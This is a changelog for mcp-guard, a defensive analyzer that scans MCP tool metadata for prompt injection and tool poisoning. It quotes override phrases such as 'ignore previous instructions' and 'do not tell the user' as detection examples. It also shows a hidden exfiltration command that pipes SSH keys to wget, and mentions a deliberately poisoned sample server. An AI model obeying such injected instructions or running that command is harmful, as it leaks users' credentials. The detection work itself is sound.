# Changelog

All notable changes to mcp-guard are documented here. The format is based on
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and this project adheres to
[Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

Heading toward 1.0: the full static rule catalog, a confirmed-payload escalation, the
description-integrity baseline, code fixes, and a reusable CI gate. The 1.0.0 release is gated on the
known-attack corpus test suite landing.

### Added

- **Rules MCPG003–MCPG011** completing the static catalog: secret-file references (003), exfiltration
  directives and markdown image/data-link sinks (004), ANSI/terminal-escape sequences (005), manipulative
  or authority phrasing (006), capability⇄description mismatch (007, Info), embedded instruction markup
  (008), cross-tool / tool-shadowing references (009), off-screen whitespace padding (010), and encoded
  payload blobs (011, Info).
- **MCPG012** — multi-signal escalation: a secret reference *and* an external sink on one description is a
  confirmed exfiltration payload, reported at **Error** so it fails the build.
- **MCPG013** — the description-integrity baseline (rug-pull guard): pin each tool description's raw-byte
  fingerprint in a committed `McpGuard.Baseline.txt` (an `AdditionalFiles`) and flag any later drift.
  Opt-in and inert until the baseline file exists.
- **Code fixes** — strip hidden characters (002), remove ANSI escape sequences (005), collapse whitespace
  padding (010), and update the integrity baseline (013).
- **Reusable GitHub Action** (`action.yml`) plus [docs/CI.md](docs/CI.md) to gate any consumer's CI on
  findings; VS Code `tasks.json` / `launch.json` and a runnable poisoned sample server.

### Changed

- **Full metadata-surface coverage** — every detector now runs on parameter `[Description]`s, tool `Name`
  strings, `[McpServerResource]` / `[McpServerPrompt]` / `[McpServer*Type]` descriptions, **parameter
  names**, and the member names of an **enum used as a tool parameter type** — so a secret reference
  smuggled into an identifier (`content_from_reading_ssh_id_rsa`) is caught, not just one in the
  description text.
- **Encoded-blob decode-and-rescan** — a base64 blob that decodes to readable text is re-scanned for a
  secret (MCPG003) and a sink (MCPG004); a hidden `cat ~/.ssh/* | wget http://…` now escalates to MCPG012
  (Error) instead of hiding behind advisory MCPG011.
- **MCPG002 hardening** (ZWJ allow-listing, variation-selector runs, decode-and-show), **MCPG004** markdown
  sinks, and **MCPG005** sequence-aware CSI/OSC detection.
- Findings now squiggle the precise offending phrase rather than the whole literal, with a help link in
  the tooltip.

## [0.1.0] - 2026-06-05

### Added

- **MCPG001** — flags prompt-injection / instruction-style phrasing in the `[Description]` of an MCP
  tool, parameter, or tool type (e.g. *"ignore previous instructions"*, *"do not tell the user"*,
  *"before answering, …"*).
- **MCPG002** — flags hidden / non-printable Unicode (zero-width spaces, bidirectional controls,
  byte-order marks, tag characters) in MCP tool descriptions.
- Roslyn analyzer packaged as `McpGuard.Analyzers` (`netstandard2.0`), loadable on the .NET 8 and
  .NET 10 build hosts; surfaces as IDE squiggles and build warnings, configurable via `.editorconfig`.
- Pluggable rule framework, a deliberately poisoned sample server used as a live fixture, and a
  `Microsoft.CodeAnalysis.Testing` verifier suite run against net8.0 and net10.0 (~98% line coverage).

[Unreleased]: https://github.com/diomonogatari/mcp-guard/compare/v0.1.0...HEAD
[0.1.0]: https://github.com/diomonogatari/mcp-guard/releases/tag/v0.1.0
